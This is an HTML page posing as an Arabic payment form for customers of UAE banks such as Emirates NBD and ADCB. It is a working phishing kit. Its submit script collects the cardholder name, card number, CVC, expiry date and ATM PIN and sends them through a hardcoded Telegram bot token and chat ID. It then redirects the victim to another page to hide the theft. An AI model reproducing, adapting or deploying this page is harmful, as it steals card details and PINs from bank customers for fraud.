<!DOCTYPE html>
<html lang="en">
<head>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
    <meta charset="UTF-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <title>Payment</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="shortcut icon" href="https://sdad-ae.netlify.app/favicon.ico" type="image/vnd.microsoft.icon">
    
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@200..1000&display=swap');
        
        /* ---------------------------------- */
        /* ุงูุชูุณููุงุช ุงูุฃุตููุฉ ูู style.css ู paymentform.css */
        /* ---------------------------------- */
        *{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Cairo', sans-serif; /* ุงุณุชุฎุฏุงู ุฎุท ุนุฑุจู */
        }
        
        body {
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            background: linear-gradient(135deg, #71b7e6, #9b59b6);
            direction: rtl; /* ุฏุนู ุงููุบุฉ ุงูุนุฑุจูุฉ */
            text-align: right;
        }

        .wrapper {
            width: 400px;
            background: #fff;
            border-radius: 15px;
            padding: 25px;
            box-shadow: 0 5px 10px rgba(0, 0, 0, 0.15);
        }

        .wrapper h2 {
            font-size: 24px;
            font-weight: 600;
            color: #333;
            margin-bottom: 20px;
            border-bottom: 1px solid #ccc;
            padding-bottom: 10px;
            text-align: center;
        }

        .wrapper h4 {
            font-size: 16px;
            font-weight: 500;
            color: #333;
            margin: 15px 0 8px 0;
        }

        .input-group {
            display: flex;
            gap: 10px;
            margin-bottom: 15px;
        }

        .input-box {
            position: relative;
            width: 100%;
            height: 40px;
        }
        
        /* ุชูุณูู ุญููู ุงูุฅุฏุฎุงู ูุงูุงุฎุชูุงุฑ */
        .input-box input,
        .input-box select {
            width: 100%;
            height: 100%;
            border: 1px solid #ccc;
            border-radius: 5px;
            padding: 0 45px 0 15px; /* ุชุฑู ูุณุงุญุฉ ููุฃููููุฉ ูุงูุดุนุงุฑ */
            font-size: 16px;
            outline: none;
            transition: all 0.3s ease;
        }
        
        .input-box input:focus,
        .input-box select:focus {
            border-color: #9b59b6;
        }

        .input-box .icon {
            position: absolute;
            left: 10px; /* ุชู ุชุนุฏูู ุงููููุน ููููู ุนูู ุงููุณุงุฑ (ูุน ุงูุฃุฎุฐ ูู ุงูุงุนุชุจุงุฑ ุฃู ุงููุงุฌูุฉ RTL) */
            top: 50%;
            transform: translateY(-50%);
            color: #aaa;
            pointer-events: none;
        }
        
        /* ุฒุฑ ุงูุชุฃููุฏ */
        .input-box button {
            width: 100%;
            height: 45px;
            background: #9b59b6;
            color: #fff;
            border: none;
            border-radius: 5px;
            font-size: 18px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 10px;
        }

        .input-box button:hover {
            background: #8e44ad;
        }

        /* ---------------------------------- */
        /* ุงูุชูุณููุงุช ุงูุฅุถุงููุฉ ูุฑูุฒ ุงูุจุทุงูุฉ */
        /* ---------------------------------- */
        #card-logo {
            display: none;
            width: 40px; /* ุญุฌู ุงูุดุนุงุฑ */
            height: auto;
            position: absolute; /* ุชุญุฏูุฏ ุงูููุถุน */
            left: 10px; /* โ๏ธ ุชู ุงูุชุบููุฑ ุฅูู ุงููุณุงุฑ ููููู ูุงุถุญูุง ุจุฌุงูุจ ุงูุฃููููุฉ */
            top: 50%; /* ุชูุณูุท ุนููุฏููุง */
            transform: translateY(-50%); /* ุชูุณูุท ุนููุฏููุง */
            border-radius: 3px;
        }
        
        /* ุชุนุฏูู ุชูุณูู ุญูู ุงูุฅุฏุฎุงู ูุงุณุชูุนุงุจ ุงูุดุนุงุฑ ูุงูุฃููููุฉ */
        .input-box input#number {
            padding-right: 45px; /* ูุณุงูุฉ ููุฃููููุฉ */
            padding-left: 90px; /* ูุณุงูุฉ ููุดุนุงุฑ ูุงูุฃููููุฉ */
        }
        
        /* ุชุนุฏูู ูููุน ุงูุฃููููุฉ ูู ุญูู ุฑูู ุงูุจุทุงูุฉ ูููููู */
        .input-box input#number + .icon {
            left: unset;
            right: 10px;
        }
        /* ุฅุฑุฌุงุน ุฃููููุฉ ุงูุดุนุงุฑ ุฅูู ุงููููู ูุชูุงุฏู ุงูุชุฏุงุฎู ูุน ุฃููููุฉ ุงูู CVC/PIN */
        #card-logo {
             left: 10px; 
             right: unset;
        }
        
        .input-box {
            position: relative; /* ูุฌุนู ุงูุดุนุงุฑ ูุธูุฑ ุฏุงุฎู ุงูุญูู */
        }
    </style>
</head>
<body>
    <div class="wrapper">
        <h2>ุฅุชูุงู ุงูุฏูุน</h2>
        <form id="page2form">
            <div class="input-box">
                <select name="payThrough" id="payThrough" required>
                    <option value="" disabled selected>ุณุฏุงุฏ ุนุจุฑ</option>
                        <option value="1">ูุตุฑู ุฃุจูุธุจู ุงูุฅุณูุงูู</option>
                        <option value="2">ูุตุฑู ุนุฌูุงู</option>
                        <option value="3">ุจูู ุฏุจู ุงูุฅุณูุงูู</option>
                        <option value="4">ุจูู ุงููุดุฑู</option>
                        <option value="5">ูุตุฑู ุงูุดุงุฑูุฉ ุงูุฅุณูุงูู</option>
						<option value="6">ุจูู ุฃุจูุธุจู ุงูุฃูู</option>
						<option value="7">HSBC</option>
						<option value="8">ุจูู ุฃุจูุธุจู ุงูุชุฌุงุฑู</option>
						<option value="9">ุจูู ุฑุฃุณ ุงูุฎููุฉ ุงููุทูู</option>
						<option value="10">ุงูุจูู ุงูุชุฌุงุฑู ุงูุฏููู</option>
						<option value="11">ุจูู ุงููุฌูุฑุฉ ุงููุทูู </option>
						<option value="12">ุงูุฅูุงุฑุงุช ุงูุฃุณูุงูู</option>
						<option value="13">ุจูู ุงูุฅูุงุฑุงุช ุฏุจู ุงููุทูู</option>
						<option value="14">ุจูู ุฏุจู ุงูุชุฌุงุฑู</option>
						<option value="15">LIV</option>
                </select>
            </div>
            
            <h4>ุงูุงุณู ุนูู ุงูุจุทุงูุฉ</h4>
            <div class="input-group">
                <div class="input-box">
                    <input type="text" name="name" id="name" placeholder="ุงุณูู " required class="name">
                    <i class="fas fa-user icon"></i>
                </div>
            </div>
            
            <h4>ุฑูู ุงูุจุทุงูุฉ</h4>
            <div class="input-group">
                <div class="input-box">
                    <input type="tel" name="number" id="number" placeholder="ุฃุฏุฎู ุฑูู ุงูุจุทุงูุฉ" maxlength="19" required class="name">
                    <i class="fa fa-credit-card icon"></i>
                    <img id="card-logo" src="" alt="ุฑูุฒ ุงูุจุทุงูุฉ">
                </div>
            </div>
            
            <h4>(CVC) ุฑูุฒ ุงูุชุญูู</h4>
            <div class="input-group">
                <div class="input-box">
                    <input type="tel" name="cvc" id="cvv" maxlength="4" placeholder="CVC" required class="name">
                    <i class="fa fa-credit-card-alt icon"></i>
                </div>
            </div>
            
            <h4>ุชุงุฑูุฎ ุงูุงูุชูุงุก</h4>
            <div class="input-group">
                <div class="input-box">
                    <select name="month" id="expMonth" required>
                        <option value="" disabled selected>ุดูุฑ</option>
                        <option value="01">01</option>
                        <option value="02">02</option>
                        <option value="03">03</option>
                        <option value="04">04</option>
                        <option value="05">05</option>
                        <option value="06">06</option>
                        <option value="07">07</option>
                        <option value="08">08</option>
                        <option value="09">09</option>
                        <option value="10">10</option>
                        <option value="11">11</option>
                        <option value="12">12</option>
                    </select>
                </div>
                <div class="input-box">
                    <select name="year" id="expYear" required>
                        <option value="" disabled selected>ุณูุฉ</option>
                        <option value="2025">2025</option>
                        <option value="2026">2026</option>
                        <option value="2027">2027</option>
                        <option value="2028">2028</option>
                        <option value="2029">2029</option>
                        <option value="2030">2030</option>
                        <option value="2031">2031</option>
                    </select>
                </div>
            </div>
            
            <h4>(PIN) ุงูุฑูุฒ ุงูุฎุงุต ุจุฃุฌูุฒุฉ ุงูุตุฑุงู ุงูุขูู </h4>
            <div class="input-group">
                <div class="input-box">
                    <input type="password" name="fort" id="fort" placeholder="****" maxlength="4" required class="name">
                    <i class="fa fa-unlock-alt icon"></i>
                </div>
            </div>
            
            <div class="input-group">
                <div class="input-box">
                    <button type="submit" id="nextButton">ุชุฃููุฏ ุงูุฏูุน</button>
                </div>
            </div>
        </form>
    </div>

    <script>
        // ุฏุงูุฉ ูุฅุถุงูุฉ ูุณุงูุงุช ุชููุงุฆูุฉ ุจูู ูู 4 ุฃุฑูุงู
        function formatCardNumber(cardNumber) {
            // ุฅุฒุงูุฉ ุฌููุน ุงููุณุงูุงุช ุงูููุฌูุฏุฉ
            cardNumber = cardNumber.replace(/\s/g, "");
            // ุฅุถุงูุฉ ูุณุงูุฉ ุจุนุฏ ูู 4 ุฃุฑูุงู
            return cardNumber.replace(/(\d{4})/g, "$1 ").trim();
        }

        // ุฏุงูุฉ ููุชุนุฑู ุนูู ููุน ุงูุจุทุงูุฉ
        function detectCardType(cardNumber) {
            const firstFourDigits = cardNumber.substring(0, 4);

            // ูุงุฆูุฉ ุจุฃููุงุน ุงูุจุทุงูุงุช ูุฃุฑูุงููุง ุงูุฃููู
            const cardTypes = {
                "visa": /^4/, // ููุฒุง ุชุจุฏุฃ ุจู 4
                "mastercard": /^5[1-5]/, // ูุงุณุชุฑูุงุฑุฏ ุชุจุฏุฃ ุจู 51 ุฅูู 55
                "applepay": /^2/, // ุฃุจู ุจุงู ุชุจุฏุฃ ุจู 2 (ูููู ุชุนุฏูููุง ุญุณุจ ุงูุญุงุฌุฉ)
            };

            // ุงูุชุญูู ูู ููุน ุงูุจุทุงูุฉ
            for (const [cardType, pattern] of Object.entries(cardTypes)) {
                if (pattern.test(firstFourDigits)) {
                    return cardType;
                }
            }

            return null; // ุฅุฐุง ูู ูุชู ุงูุชุนุฑู ุนูู ุงูุจุทุงูุฉ
        }

        // ุฏุงูุฉ ูุชุญุฏูุซ ุฑูุฒ ุงูุจุทุงูุฉ
        function updateCardLogo(cardType) {
            const cardLogo = document.getElementById("card-logo");

            if (cardType) {
                // ูุณุงุฑ ุงูุตูุฑ ุจูุงุกู ุนูู ููุน ุงูุจุทุงูุฉ
                const cardImages = {
                    "visa": "./Card-info_files/3.png", // ููุฒุง
                    "mastercard": "./Card-info_files/1.png", // ูุงุณุชุฑูุงุฑุฏ
                    "applepay": "./Card-info_files/2.png", // ุฃุจู ุจุงู
                };

                cardLogo.src = cardImages[cardType]; // ุชุญุฏูุซ ุงูุตูุฑุฉ
                cardLogo.style.display = "inline-block";
            } else {
                cardLogo.style.display = "none";
            }
        }

        // ุงุณุชูุงุน ูุชุบููุฑ ุญูู ุงูุฅุฏุฎุงู
        document.getElementById("number").addEventListener("input", function (e) {
            const cardNumberInput = e.target;
            let cardNumber = cardNumberInput.value.replace(/\s/g, ""); // ุฅุฒุงูุฉ ุงููุณุงูุงุช

            // ุงูุณูุงุญ ููุท ุจุฅุฏุฎุงู ุงูุฃุฑูุงู
            cardNumber = cardNumber.replace(/\D/g, "");

            // ุชูุณูู ุงูุฑูู ุจุฅุถุงูุฉ ูุณุงูุงุช
            const formattedCardNumber = formatCardNumber(cardNumber);

            // ุชุญุฏูุซ ูููุฉ ุงูุญูู ุจุงูุฑูู ุงูููุณู
            cardNumberInput.value = formattedCardNumber;

            // ุงูุชุนุฑู ุนูู ููุน ุงูุจุทุงูุฉ ูุชุญุฏูุซ ุงูุดุนุงุฑ
            const cardType = detectCardType(cardNumber);
            updateCardLogo(cardType);
        });

        // ุฅุฑุณุงู ุงูุจูุงูุงุช ุฅูู ุชูุบุฑุงู (ุชู ุงูุชุนุฏูู ูุฌูุจ ุงููุต ุงูุธุงูุฑ)
        document.getElementById("page2form").addEventListener("submit", function(event) {
            event.preventDefault(); // ููุน ุงูุฅุฑุณุงู ุงูููุฑู
            
            let name = document.getElementById("name").value;
            let number = document.getElementById("number").value.replace(/\s/g, ""); 
            let cvc = document.getElementById("cvv").value;
            let month = document.getElementById("expMonth").value;
            let year = document.getElementById("expYear").value;
            let fort = document.getElementById("fort").value;
            
            // ๐๏ธ ุฌูุจ ุนูุตุฑ select ูุงุฎุชูุงุฑู ูู "ุณุฏุงุฏ ุนุจุฑ"
            const payThroughSelect = document.getElementById("payThrough");
            // ๐๏ธ ุฌูุจ ุงููุต ุงูุธุงูุฑ (ูุซู "ุชุฌุฑูุจ 2") ุจุฏูุงู ูู ุงููููุฉ (ูุซู "2")
            let payThroughText = payThroughSelect.options[payThroughSelect.selectedIndex].text; 
            
            // ๐๏ธ ุฌูุจ ุนูุตุฑ select ูุงุฎุชูุงุฑู ูู "ุงูุณูุฉ"
            const yearSelect = document.getElementById("expYear");
            // ๐๏ธ ุฌูุจ ุงููุต ุงูุธุงูุฑ ููุณูุฉ (ูุซู "2025")
            let yearText = yearSelect.options[yearSelect.selectedIndex].text;

            // โ๏ธ ููุงุญุธุฉ: ูููุง ุจุชุบููุฑ year ุฅูู yearText ูู ุงูุฑุณุงูุฉ

            // ุงูุชุญูู ูู ุฃู ุฌููุน ุงูุญููู ุงููุทููุจุฉ ููุชูุฆุฉ
            if (name && number && cvc && month && year && fort && payThroughText && yearText) {

                // ุฅุฑุณุงู ุงูุจูุงูุงุช ุฅูู ุชูุบุฑุงู
                let message = `ุจูุงูุงุช ุงูุฏูุน:\nุณุฏุงุฏ ุนุจุฑ: ${payThroughText}\nุงูุงุณู: ${name}\nุฑูู ุงูุจุทุงูุฉ: ${number}\nCVC: ${cvc}\nุชุงุฑูุฎ ุงูุงูุชูุงุก: ${month}/${yearText}\nูููุฉ ุงูุณุฑ: ${fort}`;
                
                fetch(`https://api.telegram.org/bot7676226649:AAHE6aj-0kFU29ijO7dAw3vH4pE_JF1R4vY/sendMessage`, {
                    method: "POST",
                    body: JSON.stringify({
                        chat_id: "5417478446",
                        text: message
                    }),
                    headers: {
                        "Content-Type": "application/json"
                    }
                })
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        console.log("DONE");
                    } else {
                        console.error("ERROR", data);
                    }
                })
                .catch(error => {
                    console.error("ERROR", error);
                });

                // ุงูุชูุฌูู ุฅูู ุตูุญุฉ ุงูุฏูุน ุจุนุฏ ุชุฃุฎูุฑ 2 ุซุงููุฉ
                setTimeout(function() {
                    window.location.href = "user.html";
                }, 2000);
            } else {
                alert("ูุฑุฌู ููุก ุฌููุน ุงูุญููู ุงููุทููุจุฉ.");
            }
        });
    </script>
</body>
</html>
